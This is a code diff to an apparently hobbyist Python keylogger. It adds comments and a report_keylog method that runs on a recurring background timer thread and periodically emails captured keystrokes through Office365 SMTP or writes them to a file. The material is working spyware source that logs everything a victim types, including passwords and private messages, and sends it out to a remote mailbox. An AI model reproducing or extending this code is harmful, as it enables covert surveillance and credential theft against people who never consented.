@@ -1,6 +1,6 @@
 # listen to keystrokes in the background
-# whenever a key is pressed and released, add it to global string variable
-# every X number of minutes, write this string to local file or email
+# whenever a key is pressed and released, add it to a global string variable
+# every X number of minutes, write this string to a local file or send in an email
 
 # look into 'keyloggers' module
 
@@ -88,6 +88,9 @@ class Keylogger:
 
     # manage connnection to SMTP server
     def sendmail(self, email, password, message, verbose=True):
+
+        # this is using Office365. If you use a different email provider, use their SMTP servers.
+        # list of SMTP servers: https://domar.com/pages/smtp_pop3_server
         server = smtplib.SMTP(host="smtp.office365.com", port=587)
 
         server.starttls()        # connect to SMTP server with TLS for security
@@ -100,3 +103,35 @@ class Keylogger:
 
         if verbose:                # print to the console
             print(f"[*] - {datetime.now()} - Sent an email to {email} with the following message:\n{message}")
+
+
+    # this method gets called every 'self.interval'. It sends the keylog and resets 'self.log' variable 
+    def report_keylog(self):
+
+        # if a keylog exists, report it
+        if self.log:
+
+            self.end_dt = datetime.now()
+
+            self.update_filename()
+
+            if self.report_method == "email":
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+
+            elif self.report_method == "file":
+                self.report_to_file()
+
+            print(f"[{self.filename}] - {self.log}")        # OPTIONAL: print the keylog to the console
+            self.start_dt = datetime.now()
+
+        # reset the 'log' variable
+        self.log = ""
+
+        # recursively calls 'report_keylog()' each 'self.interval' in separate threads
+        timer = Timer(interval=self.interval, function=self.report_keylog)      
+
+        # '.daemon' makes the timer thread die when the main thread dies (i.e. this thread won't stop the whole program from quitting.)
+        # normally when you quit the program, the main thread waits for other threads to finish before quitting
+        timer.daemon = True
+        timer.start()       # start the timer again
+
